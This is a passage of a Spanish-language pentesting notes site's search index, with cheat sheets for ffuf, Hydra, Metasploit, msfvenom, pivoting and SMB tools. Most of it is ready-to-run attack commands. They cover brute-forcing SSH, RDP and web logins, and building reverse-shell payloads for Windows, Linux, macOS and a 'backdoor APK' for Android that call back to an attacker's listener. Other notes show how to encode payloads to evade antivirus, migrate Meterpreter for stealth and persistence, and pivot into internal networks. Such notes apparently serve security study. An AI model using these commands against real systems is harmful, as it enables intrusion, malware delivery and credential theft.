<p><code>smbmap -H 192.168.1.10 -u usuario -p contrase\u00f1a</code></p>"},{"location":"tips-tools/fuff-tips/","title":"Fuff tips","text":"<p>[[FFuF\ud83e\udeb2]]</p>"},{"location":"tips-tools/fuff-tips/#ejemplos-de-uso","title":"\ud83d\udd39 Ejemplos de uso","text":"<p>\ud83d\udd39 Buscar directorios ocultos en un sitio web</p> <pre><code>ffuf -u https://target.com/FUZZ -w wordlist.txt\n</code></pre> <p>\ud83d\udd39 Buscar archivos con extensiones espec\u00edficas</p> <pre><code>ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html\n</code></pre> <p>\ud83d\udd39 Enumerar subdominios</p> <pre><code>ffuf -u https://FUZZ.target.com -w subdomains.txt -H \"Host: FUZZ.target.com\"\n</code></pre> <p>\ud83d\udd39 Fuzzing de par\u00e1metros en una URL</p> <pre><code>ffuf -u \"https://target.com/page.php?id=FUZZ\" -w wordlist.txt\n</code></pre>"},{"location":"tips-tools/hydra-tips/","title":"Hydra","text":""},{"location":"tips-tools/hydra-tips/#uso-basico","title":"\ud83d\udccc Uso B\u00e1sico","text":"<p>La sintaxis b\u00e1sica de [[Hydra\ud83d\udc09]] es:</p> <p><code>hydra -l &lt;usuario&gt; -P &lt;archivo_de_contrase\u00f1as&gt; &lt;objetivo&gt; &lt;servicio&gt;</code></p> <p>Ejemplo atacando SSH en una m\u00e1quina:</p> <p><code>hydra -l admin -P rockyou.txt 192.168.1.10 ssh</code></p> <ul> <li><code>-l admin</code> \u2192 Usuario objetivo.</li> <li><code>-P rockyou.txt</code> \u2192 Lista de contrase\u00f1as.</li> <li><code>192.168.1.10</code> \u2192 Direcci\u00f3n IP del objetivo.</li> <li><code>ssh</code> \u2192 Servicio a atacar.</li> </ul>"},{"location":"tips-tools/hydra-tips/#opciones-utiles","title":"\ud83d\udccc Opciones \u00datiles","text":"Opci\u00f3n Descripci\u00f3n <code>-L users.txt</code> Usar un archivo con m\u00faltiples nombres de usuario. <code>-P passwords.txt</code> Usar una lista de contrase\u00f1as en vez de solo una. <code>-t 4</code> N\u00famero de intentos en paralelo (por defecto es 16). <code>-V</code> Muestra cada intento realizado. <code>-f</code> Detiene el ataque al encontrar una credencial v\u00e1lida. <p>Ejemplo para probar m\u00faltiples usuarios:</p> <p><code>hydra -L users.txt -P passwords.txt 192.168.1.10 ssh</code></p>"},{"location":"tips-tools/hydra-tips/#ataques-a-formularios-web","title":"\ud83d\udccc Ataques a Formularios Web","text":"<p>Si un sitio web tiene autenticaci\u00f3n por formulario (ejemplo, login en HTTP POST), puedes hacer:</p> <p><code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code></p> <p>Donde:</p> <ul> <li><code>/login.php</code> \u2192 P\u00e1gina del formulario.</li> <li><code>user=^USER^&amp;pass=^PASS^</code> \u2192 Par\u00e1metros de usuario y contrase\u00f1a.</li> <li><code>F=incorrect</code> \u2192 Texto que indica fallo de autenticaci\u00f3n.</li> </ul> <p>Si un sitio se hace mediante petici\u00f3n GET, puedes hacerlo de la siguiente manera:</p> <p><code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /</code></p> <p>Donde:</p> <ul> <li><code>/</code> \u2192 Pagina donde aparece el inicio de sesi\u00f3n.</li> </ul>"},{"location":"tips-tools/hydra-tips/#ataque-contra-rdp-escritorio-remoto","title":"\ud83d\udccc Ataque contra RDP (Escritorio Remoto)","text":"<p>Si el objetivo usa Windows con RDP habilitado:</p> <p><code>hydra -L users.txt -P passwords.txt 192.168.1.10 rdp</code></p> <p>Si el objetivo usa Windows con RDP habilitado en otro puerto:</p> <p><code>hydra -L users.txt -P passwords.txt 192.168.1.10 rdp -s 1234</code></p>"},{"location":"tips-tools/hydra-tips/#alternativas-a-hydra","title":"\ud83d\udccc Alternativas a Hydra","text":"<ul> <li>Medusa: Similar a Hydra, pero con m\u00e1s control sobre los ataques.</li> <li>Ncrack: Especializado en ataques a redes.</li> <li>John the Ripper: Para descifrar hashes de contrase\u00f1as.</li> </ul>"},{"location":"tips-tools/hydra-tips/#consideraciones-legales","title":"\ud83d\udccc Consideraciones Legales","text":"<p>\u26a0\ufe0f El uso de Hydra sin autorizaci\u00f3n es ilegal y puede llevarte a problemas legales. \u00dasalo solo en entornos controlados, como laboratorios de pruebas o con permiso expl\u00edcito.</p>"},{"location":"tips-tools/msfoconsole-tips/","title":"Msfoconsole tips","text":"<p>[[Msfconsole\ud83d\udee1\ufe0f]]</p>"},{"location":"tips-tools/msfoconsole-tips/#iniciar-postgresql-para-poder-usar-workspaces-en-msfconsole","title":"Iniciar PostgreSQL para poder usar workspaces en msfconsole","text":"<ul> <li><code>service postgresql start</code></li> <li><code>db_status</code></li> <li><code>db_import file.xml</code></li> </ul> <p>Comandos utiles en este caso:</p> <ul> <li>`hosts</li> <li><code>services</code></li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#enumeracion-de-file-transfer-protocol-ftp","title":"Enumeracion de [[File Transfer Protocol (FTP)]]","text":"<ul> <li><code>use auxiliary/scanner/ftp/ftp_version</code> &lt;- Para descubrir version del FTP</li> <li><code>use auxiliary/scanner/ftp/ftp_login</code> &lt;- Para fuerza bruta de inicio de sesion en FTP</li> </ul> <p>Diccionarios utiles para estos comandos: - <code>/usr/share/metasploit-framework/data/wordlists/common_users.txt</code> - <code>/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt</code></p>"},{"location":"tips-tools/msfoconsole-tips/#setear-variables-en-estado-global","title":"Setear variables en estado global","text":"<ul> <li><code>setg RHOSTS 192.168.1.1</code></li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#manera-de-buscar-cosas-en-msfconsole","title":"Manera de buscar cosas en msfconsole","text":"<ul> <li>search type:auxiliary name:smb</li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#apache","title":"Apache","text":"<ul> <li> <p>Enumerar usuarios de apache:     <code>auxiliary/scanner/http/apache_userdir_enum</code>     Diccionario recomendado: <code>/usr/share/metasploit-framework/data/wordlists/common_users.txt</code></p> </li> <li> <p>Fuerza bruta de inicio de sesion:     <code>auxiliary/scanner/http/http_login</code></p> </li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#ssh-secure-shell","title":"[[SSH (Secure Shell)]]","text":"<ul> <li>Fuerza bruta para login de ssh     <code>auxiliary/scanner/ssh/ssh_login</code></li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#modules-msfconsole","title":"Modules MSFCONSOLE","text":""},{"location":"tips-tools/msfoconsole-tips/#recon","title":"Recon","text":"<ul> <li><code>local_exploit_suggester</code> -&gt; enumera posibles brechas de seguridad en linux, windows y mac, enfocadas a la escalada de privilegios.</li> </ul>"},{"location":"tips-tools/msfoconsole-tips/#comandos-en-meterpreter","title":"Comandos en meterpreter","text":""},{"location":"tips-tools/msfoconsole-tips/#pgrep","title":"pgrep","text":"<p><code>pgrep explorer</code> -&gt; utilizado para buscar el proceso 'explorer', si hay instancias del proceso <code>explorer.exe</code>, el cual es el proceso principal del explorador windows, devolvera el ID</p> <pre><code>pgrep explorer\n2448\n</code></pre>"},{"location":"tips-tools/msfoconsole-tips/#migrate","title":"migrate","text":"<p><code>migrate</code> -&gt; migrar, mover la sesion de meterpreter a otro proceso en el sistema, en este caso <code>migrate 2448</code>, le indica a meterpreter que debe trasladar la sesion de su proceso actual al 2448, que es <code>explorar.exe</code></p> <p>\u00bfPor qu\u00e9 se hace esto?</p> <p>Migrar a un proceso como <code>explorer.exe</code> tiene varias razones en un ataque:</p> <ol> <li> <p>Evasi\u00f3n de detecci\u00f3n: El proceso <code>explorer.exe</code> es una parte fundamental del sistema operativo y generalmente no ser\u00e1 monitoreado de la misma forma que un proceso sospechoso que podr\u00eda estar relacionado con una intrusi\u00f3n. Esto ayuda a evitar que las herramientas de seguridad o antivirus detecten la sesi\u00f3n de Meterpreter.</p> </li> <li> <p>Persistencia: Migrar a un proceso en ejecuci\u00f3n podr\u00eda permitir que la sesi\u00f3n de Meterpreter contin\u00fae funcionando incluso si el proceso original de la sesi\u00f3n se termina o se reinicia.</p> </li> <li> <p>Manipulaci\u00f3n del sistema: Al migrar a un proceso com\u00fan y conocido, los atacantes pueden interactuar de manera m\u00e1s sutil con el sistema, sin levantar demasiadas sospechas.</p> </li> </ol>"},{"location":"tips-tools/msfoconsole-tips/#getprivs","title":"getprivs","text":"<p>El comando <code>getprivs</code> en Meterpreter se utiliza para enumerar los privilegios que tiene la sesi\u00f3n de Meterpreter sobre el sistema comprometido. Al ejecutar este comando, Meterpreter muestra los privilegios que est\u00e1n disponibles o habilitados en el contexto de seguridad de la sesi\u00f3n actual.</p>"},{"location":"tips-tools/msfoconsole-tips/#ejemplo-de-salida-tipica-de-getprivs","title":"Ejemplo de salida t\u00edpica de <code>getprivs</code>:","text":"<p>Cuando ejecutas <code>getprivs</code>, podr\u00edas ver una salida similar a esta:</p> <pre><code>[*] Privileges:\n    SeDebugPrivilege     (Enabled)\n    SeBackupPrivilege    (Enabled)\n    SeRestorePrivilege   (Enabled)\n    SeShutdownPrivilege  (Enabled)\n    SeChangeNotifyPrivilege (Enabled)\n    SeTakeOwnershipPrivilege (Enabled)\n</code></pre>"},{"location":"tips-tools/msfoconsole-tips/#explicacion-de-algunos-privilegios-comunes","title":"Explicaci\u00f3n de algunos privilegios comunes:","text":"<ol> <li> <p>SeDebugPrivilege: Permite a un usuario o proceso depurar otros procesos. Si est\u00e1 habilitado, puede ser usado para obtener acceso completo a otros procesos o manipularlos, lo que puede ser \u00fatil en un ataque para escalar privilegios.</p> </li> <li> <p>SeBackupPrivilege: Permite al usuario realizar copias de seguridad de archivos del sistema, incluso si no tiene permisos sobre esos archivos. Es un privilegio que se usa para copiar archivos incluso si est\u00e1n protegidos.</p> </li> <li> <p>SeRestorePrivilege: Permite a un usuario restaurar archivos desde una copia de seguridad. Similar al privilegio anterior, pero en la direcci\u00f3n opuesta: puede restaurar archivos incluso si no tiene permisos sobre esos archivos.</p> </li> <li> <p>SeShutdownPrivilege: Permite apagar el sistema. Si un atacante tiene este privilegio, puede apagar el sistema remoto.</p> </li> <li> <p>SeTakeOwnershipPrivilege: Permite tomar la propiedad de archivos y objetos del sistema, lo que podr\u00eda ser \u00fatil para modificar archivos o configuraciones a las que normalmente no tendr\u00eda acceso.</p> </li> <li> <p>SeChangeNotifyPrivilege: Permite a los usuarios recibir notificaciones de cambios en el sistema, como cambios en los archivos o directorios.</p> </li> </ol>"},{"location":"tips-tools/msfoconsole-tips/#por-que-es-importante-este-comando","title":"\u00bfPor qu\u00e9 es importante este comando?","text":"<ul> <li> <p>Escalada de privilegios: Si encuentras que la sesi\u00f3n de Meterpreter tiene privilegios como <code>SeDebugPrivilege</code> o <code>SeTakeOwnershipPrivilege</code>, esto podr\u00eda abrir puertas para una escalada de privilegios. Con estos privilegios, un atacante podr\u00eda tomar control completo del sistema, manipular otros procesos, o acceder a archivos protegidos.</p> </li> <li> <p>Evasi\u00f3n y persistencia: Algunos de estos privilegios pueden ser \u00fatiles para evadir la detecci\u00f3n, restaurar archivos de configuraci\u00f3n o realizar copias de seguridad/restauraci\u00f3n del sistema de manera que no se noten f\u00e1cilmente.</p> </li> </ul>"},{"location":"tips-tools/msfvenom-tips/","title":"Msfvenom","text":"<p>[[MSFVenom\ud83d\udd25]]</p>"},{"location":"tips-tools/msfvenom-tips/#1-payloads-comunes","title":"\ud83d\udd39 1. Payloads Comunes","text":"<p>Aqu\u00ed hay ejemplos de c\u00f3mo generar payloads para diferentes sistemas operativos.</p>"},{"location":"tips-tools/msfvenom-tips/#windows-meterpreter-reverse-shell","title":"\ud83d\udccc Windows - Meterpreter Reverse Shell","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe\n</code></pre> <p>\u2705 Genera un archivo <code>shell.exe</code> que, cuando se ejecute en la v\u00edctima, enviar\u00e1 una conexi\u00f3n inversa a tu m\u00e1quina.</p>"},{"location":"tips-tools/msfvenom-tips/#linux-meterpreter-reverse-shell","title":"\ud83d\udccc Linux - Meterpreter Reverse Shell","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf\n</code></pre> <p>\u2705 Genera un ejecutable ELF para Linux.</p>"},{"location":"tips-tools/msfvenom-tips/#android-backdoor-apk","title":"\ud83d\udccc Android - Backdoor APK","text":"<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f apk -o backdoor.apk\n</code></pre> <p>\u2705 Crea un APK malicioso que, cuando la v\u00edctima lo instale, dar\u00e1 acceso remoto.</p>"},{"location":"tips-tools/msfvenom-tips/#macos-reverse-shell","title":"\ud83d\udccc MacOS - Reverse Shell","text":"<pre><code>msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho\n</code></pre> <p>\u2705 Payload para MacOS en formato <code>.macho</code>.</p>"},{"location":"tips-tools/msfvenom-tips/#2-ejecutar-el-payload-en-metasploit","title":"\ud83d\udd39 2. Ejecutar el Payload en Metasploit","text":"<p>Una vez generado el payload, abre Metasploit y configura un listener para recibir conexiones.</p> <p>1\ufe0f\u20e3 Abrir Metasploit:</p> <pre><code>msfconsole\n</code></pre> <p>2\ufe0f\u20e3 Configurar el handler:</p> <pre><code>use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nrun\n</code></pre> <p>\u2705 Cuando la v\u00edctima ejecute el payload, obtendr\u00e1s acceso remoto con Meterpreter.</p>"},{"location":"tips-tools/msfvenom-tips/#3-codificar-y-ofuscar-payloads","title":"\ud83d\udd39 3. Codificar y Ofuscar Payloads","text":"<p>Los antivirus pueden detectar los payloads generados. Puedes codificarlos para evadir detecci\u00f3n.</p>"},{"location":"tips-tools/msfvenom-tips/#ejemplo-codificar-con-shikata_ga_nai","title":"\ud83d\udccc Ejemplo: Codificar con <code>shikata_ga_nai</code>","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_hidden.exe\n</code></pre> <p>\u2705 <code>-e x86/shikata_ga_nai</code> \u2192 Usa el encoder <code>shikata_ga_nai</code>. \u2705 <code>-i 5</code> \u2192 Codifica el payload 5 veces.</p>"},{"location":"tips-tools/msfvenom-tips/#4-formatos-de-salida-f","title":"\ud83d\udd39 4. Formatos de Salida (<code>-f</code>)","text":"<p>Puedes generar payloads en diferentes formatos:</p> Formato Descripci\u00f3n exe Windows ejecutable elf Linux ejecutable apk Android APK macho MacOS ejecutable raw C\u00f3digo en bruto c C\u00f3digo en C python C\u00f3digo en Python bash Script en Bash <p>Ejemplo:</p> <pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw\n</code></pre> <p>\u2705 Genera un shell reverso en Bash.</p>"},{"location":"tips-tools/msfvenom-tips/#5-bypass-antivirus","title":"\ud83d\udd39 5. Bypass Antivirus","text":"<p>Los antivirus detectan payloads est\u00e1ndar. Para evadir detecci\u00f3n:</p> <ul> <li>Usa codificaci\u00f3n (<code>-e x86/shikata_ga_nai</code>).</li> <li>Modifica el c\u00f3digo (<code>-f c</code> y comp\u00edlalo manualmente).</li> <li>Usa herramientas como Veil-Evasion o Shellter.</li> </ul> <p>Ejemplo de payload en Python:</p> <pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw\n</code></pre> <p>Despu\u00e9s lo modificas en un script <code>.py</code> y lo compilas con <code>pyinstaller</code>.</p>"},{"location":"tips-tools/pivoting-tips/","title":"Pivoting","text":""},{"location":"tips-tools/pivoting-tips/#pivoting-con-proxychains-en-metasploit","title":"\ud83d\udd25 Pivoting con <code>proxychains</code> en Metasploit","text":"<p>Si quieres usar herramientas externas como Nmap, RDP o SMB para explorar la red interna, necesitas configurar un t\u00fanel SOCKS y enrutar el tr\u00e1fico a trav\u00e9s de la m\u00e1quina comprometida.</p>"},{"location":"tips-tools/pivoting-tips/#1-configurar-autoroute-en-meterpreter","title":"\ud83d\ude80 1\ufe0f\u20e3 Configurar <code>autoroute</code> en Meterpreter","text":"<p>Si no lo has hecho, a\u00f1ade la ruta de la red interna a trav\u00e9s de la m\u00e1quina pivot:</p> <pre><code>run autoroute -s 10.0.16.0/20\n</code></pre> <p>Verifica que la ruta est\u00e1 agregada:</p> <pre><code>run autoroute -p\n</code></pre> <p>O usa: <code>for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.0.%i &gt; nul &amp;&amp; echo 192.168.0.%i is up.</code></p> <pre><code>route print\n</code></pre>"},{"location":"tips-tools/pivoting-tips/#2-configurar-el-servidor-socks-en-metasploit","title":"\ud83c\udf10 2\ufe0f\u20e3 Configurar el servidor SOCKS en Metasploit","text":"<p>Para redirigir el tr\u00e1fico a trav\u00e9s de la m\u00e1quina comprometida, ejecuta:</p> <pre><code>use auxiliary/server/socks_proxy\nset SRVPORT 1080  # Puerto del proxy SOCKS\nset VERSION 5     # Usamos SOCKS5\nrun\n</code></pre> <p>o</p> <pre><code>use auxiliary/server/socks_proxy\nset SRVPORT 9050  # Puerto del proxy SOCKS4\nset VERSION 4a     # Usamos SOCKS4\nrun\n</code></pre> <p>\u2705 Esto crea un servidor SOCKS en <code>localhost:1080</code> que enviar\u00e1 tr\u00e1fico a la red interna a trav\u00e9s de Meterpreter.</p>"},{"location":"tips-tools/pivoting-tips/#3-configurar-proxychains","title":"\ud83d\udee0 3\ufe0f\u20e3 Configurar <code>proxychains</code>","text":"<p>Ahora necesitamos decirle a <code>proxychains</code> que use el proxy SOCKS de Metasploit.</p> <p>\ud83d\udccc Edita el archivo de configuraci\u00f3n de <code>proxychains</code></p> <pre><code>nano /etc/proxychains.conf\n</code></pre> <p>\ud83d\udd39 Cambia la \u00faltima l\u00ednea para definir el proxy SOCKS5 de Metasploit:</p> <pre><code>socks5 127.0.0.1 1080\n</code></pre> <p>o</p> <pre><code>socks4 127.0.0.1 9050\n</code></pre> <p>Guarda y cierra el archivo (<code>CTRL + X</code>, <code>Y</code>, <code>ENTER</code>).</p>"},{"location":"tips-tools/pivoting-tips/#4-usar-herramientas-con-proxychains","title":"\ud83c\udfaf 4\ufe0f\u20e3 Usar herramientas con <code>proxychains</code>","text":"<p>Ahora puedes usar cualquier herramienta a trav\u00e9s del t\u00fanel SOCKS.</p>"},{"location":"tips-tools/pivoting-tips/#escanear-la-red-interna-con-nmap","title":"\ud83d\udd0d Escanear la red interna con Nmap","text":"<pre><code>proxychains nmap -sT -Pn -n -p 445,3389 10.0.16.0/20\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>-sT</code> \u2192 Escaneo TCP (porque SYN no funciona bien con SOCKS).</li> <li><code>-Pn</code> \u2192 No hacer ping, asumir que los hosts est\u00e1n activos.</li> <li><code>-n</code> \u2192 No resolver DNS.</li> <li><code>-p 445,3389</code> \u2192 Buscar puertos SMB y RDP.</li> </ul>"},{"location":"tips-tools/pivoting-tips/#escanear-una-ip-identificada-con-nmap","title":"\ud83d\udd0d Escanear una ip identificada con Nmap","text":"<pre><code>proxychains nmap -sT -Pn -n -p- -sCV 10.0.16.48\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>-sT</code> \u2192 Escaneo TCP (porque SYN no funciona bien con SOCKS).</li> <li><code>-Pn</code> \u2192 No hacer ping, asumir que los hosts est\u00e1n activos.</li> <li><code>-n</code> \u2192 No resolver DNS.</li> <li><code>-p-</code> \u2192 Buscar puertos SMB y RDP.</li> <li><code>-sCV es el conjunto de dos comandos juntos</code> \u2192 <code>-sC</code> = ejecuta scripts comunes para el puerto encontrado, <code>-sV</code> = identifica la version del servicio corriendo en el puerto encontrado</li> </ul>"},{"location":"tips-tools/pivoting-tips/#cargar-exploit-con-msfconsole-en-la-maquina-identificada","title":"Cargar exploit con msfconsole en la maquina identificada","text":"<ul> <li>Si est\u00e1s utilizando\u00a0<code>proxychains</code>, aseg\u00farate de que el exploit se ejecute a trav\u00e9s del t\u00fanel SOCKS:</li> </ul> <pre><code>set Proxies socks4:&lt;IP donde corre el proxy (comunmente localhost 127.0.0.1)&gt;:&lt;puerto SOCKS&gt;\n</code></pre> <p>Cuando se realiza un ataque de este tipo debemos usar el bind_tcp</p> <ul> <li>Windows: <code>set PAYLOAD windows/meterpreter/bind_tcp</code></li> <li>Linux: <code>set PAYLOAD linux/meterpreter/bind_tcp</code></li> </ul>"},{"location":"tips-tools/pivoting-tips/#haz-el-port-forwarding-con-meterpreter-si-aplica","title":"\u2705 Haz el port forwarding (con Meterpreter, si aplica)","text":"<p>\ud83d\udc49 Ejecuta:</p> <pre><code>portfwd add -l 1234 -p 80 -r 10.4.22.56\n</code></pre> <p>\ud83d\udc49 Explicaci\u00f3n:</p> Par\u00e1metro Descripci\u00f3n -l 1234 Es el puerto local en tu m\u00e1quina. (localhost:1234) -p 80 Es el puerto del servidor v\u00edctima (puerto 80 HTTP). -r 10.4.22.56 Es la IP del servidor v\u00edctima. <p>Lo que hace esto:</p> <ul> <li>Redirige TODO lo que entre a <code>localhost:8080</code> \u27a1\ufe0f al servidor web de la v\u00edctima (<code>10.4.22.56:80</code></li> </ul>"},{"location":"tips-tools/pivoting-tips/#conectar-a-smb-en-la-red-interna","title":"\ud83d\udda5 Conectar a SMB en la red interna","text":"<pre><code>proxychains smbclient -L //10.0.20.50 -U usuario%contrase\u00f1a\n</code></pre>"},{"location":"tips-tools/pivoting-tips/#conectar-a-rdp-en-la-red-interna","title":"\ud83d\udda5 Conectar a RDP en la red interna","text":"<pre><code>proxychains xfreerdp /u:admin /p:password /v:10.0.20.50\n</code></pre>"},{"location":"tips-tools/pivoting-tips/#montar-un-recurso-compartido-smb","title":"\ud83d\udcc2 Montar un recurso compartido SMB","text":"<pre><code>proxychains mount -t cifs //10.0.20.50/share /mnt -o username=admin,password=contrase\u00f1a\n</code></pre>"},{"location":"tips-tools/pivoting-tips/#resumen","title":"\ud83c\udfc6 Resumen","text":"<p>\u2705 1\ufe0f\u20e3 Configurar <code>autoroute</code> en Meterpreter para enrutar tr\u00e1fico interno. \u2705 2\ufe0f\u20e3 Iniciar un servidor SOCKS en Metasploit (<code>auxiliary/server/socks_proxy</code>). \u2705 3\ufe0f\u20e3 Configurar <code>proxychains</code> en <code>/etc/proxychains.conf</code>. \u2705 4\ufe0f\u20e3 Usar herramientas externas (<code>nmap</code>, <code>smbclient</code>, <code>xfreerdp</code>, etc.) para atacar la red interna.</p> <p>\ud83d\udd25 Con esto, puedes explorar la red pivotando desde la m\u00e1quina comprometida sin depender solo de Metasploit.</p>"},{"location":"tips-tools/smbclient-tips/","title":"SMBClient","text":"<p>[[smbclient\ud83d\udccb]]</p>"},{"location":"tips-tools/smbclient-tips/#listar-recursos-compartidos-en-un-servidor","title":"\ud83d\udd0d Listar recursos compartidos en un servidor","text":"<p>Para ver los recursos compartidos en un servidor SMB:</p> <p><code>smbclient -L //&lt;IP_o_NOMBRE_DEL_SERVIDOR&gt; -U &lt;usuario&gt;</code></p> <p>Ejemplo:</p> <p><code>smbclient -L //192.168.1.10 -U administrador</code></p> <p>Esto pedir\u00e1 la contrase\u00f1a y mostrar\u00e1 los recursos compartidos.</p> <p>Si el servidor no requiere autenticaci\u00f3n, puedes probar con <code>-N</code> (sin contrase\u00f1a):</p> <p><code>smbclient -L //192.168.1.10 -N</code></p> <p>Podemos realizar fuerza bruta para detectar si hay archivos ocultos con este script [[Enumerate SMB hidden recourses]]</p> <p>Tambien podemos realizar ataques de fuerza bruta a inicios de sesion del smb una vez tengamos listados los usuarios con enum4linux, utilizando el auxiliar de metasploit smb_login</p>"},{"location":"tips-tools/smbclient-tips/#conectarse-a-un-recurso-compartido","title":"\ud83d\udcc2 Conectarse a un recurso compartido","text":"<p>Para acceder a un recurso compartido:</p> <p><code>smbclient //&lt;IP_o_NOMBRE_DEL_SERVIDOR&gt;/&lt;RECURSO&gt; -U &lt;usuario&gt;</code></p> <p>Ejemplo:</p> <p><code>smbclient //192.168.1.10/Documentos -U administrador</code></p> <p>Despu\u00e9s de ingresar la contrase\u00f1a, entrar\u00e1s en un shell interactivo similar a FTP, donde puedes usar comandos como:</p> <ul> <li><code>ls</code> \u2192 Listar archivos en el recurso compartido.</li> <li><code>cd &lt;directorio&gt;</code> \u2192 Cambiar de directorio.</li> <li><code>get &lt;archivo&gt;</code> \u2192 Descargar un archivo.</li> <li><code>put &lt;archivo&gt;</code> \u2192 Subir un archivo.</li> <li><code>exit</code> \u2192 Salir del cliente.</li> </ul>"},{"location":"tips-tools/smbclient-tips/#descargar-un-archivo-directamente","title":"\ud83d\udce5 Descargar un archivo directamente","text":"<p>Si quieres descargar un archivo sin entrar al modo interactivo:</p> <p><code>smbclient //&lt;IP&gt;/Compartido -U usuario -c \"get archivo.txt\"</code></p> <p>Ejemplo:</p> <p><code>smbclient //192.168.1.10/Publico -U administrador -c \"get informe.pdf\"</code></p>"},{"location":"tips-tools/smbclient-tips/#subir-un-archivo-directamente","title":"\ud83d\udce4 Subir un archivo directamente","text":"<p>Si quieres subir un archivo sin modo interactivo:</p> <p><code>smbclient //&lt;IP&gt;/Compartido -U usuario -c \"put archivo_local archivo_remoto\"</code></p> <p>Ejemplo:</p> <p><code>smbclient //192.168.1.10/Documentos -U administrador -c \"put notas.txt notas_servidor.txt\"</code></p>"},{"location":"tips-tools/smbclient-tips/#conectarse-a-smb-con-una-contrasena-en-linea-de-comandos","title":"\ud83d\udd11 Conectarse a SMB con una contrase\u00f1a en l\u00ednea de comandos","text":"<p>Para evitar que <code>smbclient</code> te pida la contrase\u00f1a interactivamente, puedes pasarla en la l\u00ednea de comandos (\u26a0\ufe0f No recomendado por seguridad):</p> <p><code>smbclient //&lt;IP&gt;/Compartido -U usuario%contrase\u00f1a</code></p> <p>Ejemplo:</p> <p><code>smbclient //192.168.1.10/Documentos -U administrador%SuperSecreta123</code></p> <p>Alternativa m\u00e1s segura: Guardar la contrase\u00f1a en un archivo y usar <code>--password-file</code>:</p> <p><code>echo \"SuperSecreta123\" &gt; smb_pass.txt chmod 600 smb_pass.txt smbclient //&lt;IP&gt;/Compartido -U administrador --password-file=smb_pass.txt</code></p>"},{"location":"tips-tools/smbclient-tips/#montar-un-recurso-smb-en-linux","title":"\ud83c\udff4 Montar un recurso SMB en Linux","text":"<p>Si prefieres acceder al recurso compartido como una carpeta en el sistema:</p> <p><code>sudo mount -t cifs //&lt;IP&gt;/Compartido /mnt/smb -o username=usuario,password=contrase\u00f1a</code></p> <p>Ejemplo:</p> <p><code>sudo mount -t cifs //192.168.1.10/Documentos /mnt/smb -o username=admin,password=SuperSecreta123</code></p> <p>Para desmontarlo:</p> <p><code>sudo umount /mnt/smb</code></p>"},{"location":"tips-tools/smbclient-tips/#automatizacion-con-credenciales-guardadas","title":"\ud83d\udd04 Automatizaci\u00f3n con Credenciales Guardadas","text":"<p>Si accedes frecuentemente a un recurso SMB, puedes guardar las credenciales en <code>/etc/samba/credentials</code>:</p> <ol> <li> <p>Crea el archivo:</p> <p><code>sudo nano /etc/samba/credentials</code></p> </li> <li> <p>Agrega:</p> <p><code>username=admin password=SuperSecreta123</code></p> </li> <li> <p>Guarda y cambia los permisos:</p> <p><code>sudo chmod 600 /etc/samba/credentials</code></p> </li> <li> <p>Monta autom\u00e1ticamente:</p> <p><code>sudo mount -t cifs //192.168.1.10/Documentos /mnt/smb -o credentials=/etc/samba/credentials</code></p> </li> </ol>"},{"location":"tips-tools/smbclient-tips/#solucion-de-problemas","title":"\ud83d\udee0 Soluci\u00f3n de problemas","text":""},{"location":"tips-tools/smbclient-tips/#error-nt_status_access_denied","title":"\u274c Error: \"NT_STATUS_ACCESS_DENIED\"","text":"<ul> <li>Verifica que el usuario y contrase\u00f1a sean correctos.</li> <li> <p>Si el servidor requiere autenticaci\u00f3n NTLMv1, agrega <code>--option='client min protocol=NT1'</code>:</p> <p><code>smbclient //&lt;IP&gt;/Compartido -U usuario --option='client min protocol=NT1'</code></p> </li> </ul>"},{"location":"tips-tools/smbclient-tips/#error-could-not-resolve-address-for","title":"\u274c Error: \"Could not resolve address for ...\"","text":"<ul> <li>Intenta con la direcci\u00f3n IP en lugar del nombre del servidor.</li> </ul>"},{"location":"tips-tools/smbclient-tips/#error-mount-error13-permission-denied","title":"\u274c Error: \"Mount error(13): Permission denied\"","text":"<ul> <li> <p>Puede ser un problema de permisos, prueba con <code>sec=ntlm</code>:</p> <p><code>sudo mount -t cifs //192.168.1.10/Documentos /mnt/smb -o username=admin,password=SuperSecreta123,sec=ntlm</code></p> </li> </ul>"},{"location":"tips-tools/smbmap-tips/","title":"SMBMap","text":"<p>[[smbmap]]</p>"},{"location":"tips-tools/smbmap-tips/#ejemplos-de-uso","title":"\ud83d\udccc Ejemplos de Uso","text":"<p>1\ufe0f\u20e3 Enumerar recursos compartidos en una m\u00e1quina SMB an\u00f3nima</p> <pre><code>smbmap -H 192.168.1.10\n</code></pre> <p>\ud83d\udc49 Muestra los recursos compartidos accesibles sin autenticaci\u00f3n.</p> <p>2\ufe0f\u20e3 Enumerar recursos con credenciales (usuario y contrase\u00f1a)</p> <pre><code>smbmap -H 192.168.1.10 -u usuario -p contrase\u00f1a\n</code></pre> <p>\ud83d\udc49 Lista los recursos accesibles con ese usuario.</p> <p>3\ufe0f\u20e3 Listar archivos dentro de un recurso compartido</p> <pre><code>smbmap -H 192.168.1.10 -u usuario -p 